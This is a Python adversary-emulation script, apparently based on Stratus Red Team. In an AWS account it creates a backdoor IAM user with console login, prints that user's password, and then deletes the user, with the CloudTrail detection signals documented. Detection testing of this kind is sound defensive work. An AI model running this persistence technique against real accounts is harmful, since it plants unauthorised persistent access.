"""
Technique : aws.persistence.iam-create-user-login-profile
Tactic    : Persistence (T1136.003)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.iam-create-user-login-profile/

Pre-requisites:
  - None. The script creates and destroys its own IAM user.

How the attack works:
  An attacker with iam:CreateUser + iam:CreateLoginProfile creates a new IAM
  user and immediately enables console login.  This gives the attacker a
  persistent identity distinct from any compromised credentials, making it
  harder to detect and revoke access without comprehensive IAM audits.

Detection signal:
  - iam:CreateUser followed immediately by iam:CreateLoginProfile.
  - New console-enabled IAM user created outside normal provisioning pipelines
    (e.g., Terraform, CloudFormation, or designated admin roles).

Revert:
  - Automated: DeleteLoginProfile + DeleteUser in the finally block.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import secrets
import string
import time

import boto3
from botocore.exceptions import ClientError


# ── Constants ─────────────────────────────────────────────────────────────────

BACKDOOR_USER_NAME = "stratus-red-team-backdoor-user"
DWELL_TIME_S       = 2


# ── Helpers ───────────────────────────────────────────────────────────────────

def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def generate_password(length: int = 16) -> str:
    """Generate a random IAM-compliant password (upper, lower, digit, symbol)."""
    alphabet = string.ascii_letters + string.digits + "!@#$%^&*()"
    while True:
        pwd = "".join(secrets.choice(alphabet) for _ in range(length))
        if (any(c.isupper() for c in pwd)
                and any(c.islower() for c in pwd)
                and any(c.isdigit() for c in pwd)
                and any(c in "!@#$%^&*()" for c in pwd)):
            return pwd


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    session    = boto3.Session()
    iam_client = session.client("iam")

    user_created    = False
    profile_created = False

    try:
        # ── Step 1: Create backdoor IAM user ─────────────────────────────────
        banner("Step 1 — Create backdoor IAM user (CreateUser)")
        iam_client.create_user(
            UserName=BACKDOOR_USER_NAME,
            Tags=[
                {"Key": "StratusRedTeam",  "Value": "true"},
                {"Key": "Purpose",         "Value": "adversary-emulation"},
                {"Key": "Technique",       "Value": "aws.persistence.iam-create-user-login-profile"},
            ],
        )
        user_created = True
        print(f"  [+] User created: {BACKDOOR_USER_NAME}")
        print(f"  [!] CloudTrail event: iam:CreateUser")

        # ── Step 2: Enable console login ─────────────────────────────────────
        banner("Step 2 — Enable console login (CreateLoginProfile)")
        attacker_password = generate_password()
        iam_client.create_login_profile(
            UserName=BACKDOOR_USER_NAME,
            Password=attacker_password,
            PasswordResetRequired=False,
        )
        profile_created = True
        print(f"  [+] Login profile created for: {BACKDOOR_USER_NAME}")
        print(f"  [+] Attacker console password: {attacker_password}")
        print(f"  [!] CloudTrail event: iam:CreateLoginProfile")
        print(f"  [!] Attacker can now log in to AWS console as: {BACKDOOR_USER_NAME}")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert ────────────────────────────────────────────────────────────
        banner("Revert — Cleaning up backdoor user")
        if profile_created:
            try:
                iam_client.delete_login_profile(UserName=BACKDOOR_USER_NAME)
                print(f"  [+] Login profile deleted")
            except ClientError as exc:
                print(f"  [!] DeleteLoginProfile failed: {exc}")

        if user_created:
            try:
                iam_client.delete_user(UserName=BACKDOOR_USER_NAME)
                print(f"  [+] User deleted: {BACKDOOR_USER_NAME}")
            except ClientError as exc:
                print(f"  [!] DeleteUser failed: {exc}")

    banner("Complete")
    print("CloudTrail events: iam:CreateUser, iam:CreateLoginProfile")
    print("\nDetection guidance:")
    print("  Alert when iam:CreateUser is followed by iam:CreateLoginProfile")
    print("  from a principal that is not a known provisioning role.")


if __name__ == "__main__":
    main()
